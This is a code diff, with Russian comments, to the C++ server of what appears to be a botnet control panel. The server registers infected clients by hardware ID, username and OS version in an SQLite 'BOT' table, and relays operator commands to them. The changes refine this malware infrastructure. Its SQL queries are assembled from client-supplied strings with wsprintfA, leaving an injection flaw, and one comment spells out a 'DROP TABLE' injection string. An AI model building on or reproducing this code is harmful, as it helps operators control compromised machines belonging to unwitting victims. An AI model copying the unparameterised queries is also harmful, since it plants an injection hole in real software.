@@ -119,12 +119,7 @@ DWORD WINAPI ConsoleReader(LPVOID param)
 		getline(cin, line); //считываем символы в этот класс из консоли
 		char* mycmd = strdup(line.c_str()); //конвертируем эти сиволы в чары, вызывая метод с_str
 
-		if ((mycmd[0] == 'm' && mycmd[1] == 'a' && mycmd[2] == 'n')) // если наша команда равна 'man'
-		{
-			//тут можно напечатать команды которые можно писать в консоли
-
-		}
-		else if ((mycmd[0] == 'c' && mycmd[1] == 'm' && mycmd[2] == 'd')) // если наша команда равна 'cmd'
+		if ((mycmd[0] == 'c' && mycmd[1] == 'm' && mycmd[2] == 'd')) // если наша команда равна 'cmd'
 		{
 			//тут мы создаем какую нибудь команду и отсылаем ее клиенту
 			if (mycmd[3] == ':') // если следуший символ двоеточие
@@ -243,13 +238,20 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 				CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
 				memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
 				memset(&client, 0, sizeof(CLIENTS)); //почистим
-				recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от клиента
+				
+				//recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0);
+				if (sizeof(CMDiDATA) != recv(newConn, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от клиента
+				{
+					closesocket(newConn);
+					continue;
+				}
 
 				if (indata.CMD == 0) //если CMD = 0, то это хендшейк
 				{
 					memcpy(&client, indata.DATA, sizeof(CLIENTS)); //копируем DATA в структуру client
 
 					char* zapros_1 = new char[1000];
+					//тут было бы возможно провести sql инъекцию, если бы не SELECT *'; DROP TABLE BOT;-- 
 					wsprintfA(zapros_1, "SELECT NOMER FROM BOT WHERE HWID='%s' AND USERNAME='%s' AND OSVER='%s'", client.HWID, client.USERNAME, client.OSVER);
 
 					sqlite3_stmt* stmt_1;
@@ -276,7 +278,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 							}
 							else
 							{
-								printf("Error Add Old Client %s", ErrMsg);
+								printf("ZAPROS: %s;\nError: %s\n", zapros_2, ErrMsg);
 							}
 							//чистим строку
 							delete[] zapros_2;
@@ -287,7 +289,6 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 							if (sqlite3_prepare_v2(db, "SELECT NOMER FROM BOT ORDER BY NOMER DESC LIMIT 1", -1, &stmt_3, 0) == SQLITE_OK && sqlite3_step(stmt_3) == SQLITE_ROW)
 							{
 								int NEWNOMER = sqlite3_column_int(stmt_3, 0) + 1; // и плюсуем единичку
-								NEWNOMER++;
 								char* zapros_3 = new char[1000];
 								wsprintfA(zapros_3, \
 									"INSERT INTO BOT (NOMER, HWID, USERNAME, OSVER, OTVET) VALUES ('%d', '%s', '%s', '%s', 1)", \
@@ -300,17 +301,22 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 									memcpy(SOCKETS[NEWNOMER].USERNAME, client.USERNAME, sizeof(client.USERNAME));
 									memcpy(SOCKETS[NEWNOMER].OSVER, client.OSVER, sizeof(client.OSVER));
 									//сигнал тут может быть о том что новый клиент онлайн
+									printf("\n\nclient.HWID: %s\n\tlen: %d\n\nclient.USERNAME: %s\n\tlen: %d\n\nclient.OSVER: %s\n\tlen: %d\n\n", client.HWID, lstrlenA(client.HWID), client.USERNAME, lstrlenA(client.USERNAME), client.OSVER, lstrlenA(client.OSVER));
 									count_clients++;
 								}
 								else
 								{
-									printf("Error Add New Client %s", ErrMsg);
+									printf("ZAPROS: %s;\nError: %s\n", zapros_3, ErrMsg);
 								}
 								sqlite3_finalize(stmt_3);
 								//чистим строку
 								delete[] zapros_3;
 							}
 						}
+					} 
+					else
+					{
+						printf("ZAPROS: %s;\nERR: %s\n", zapros_1, sqlite3_errmsg(db));
 					}
 					sqlite3_finalize(stmt_1);
 					//чистим строку
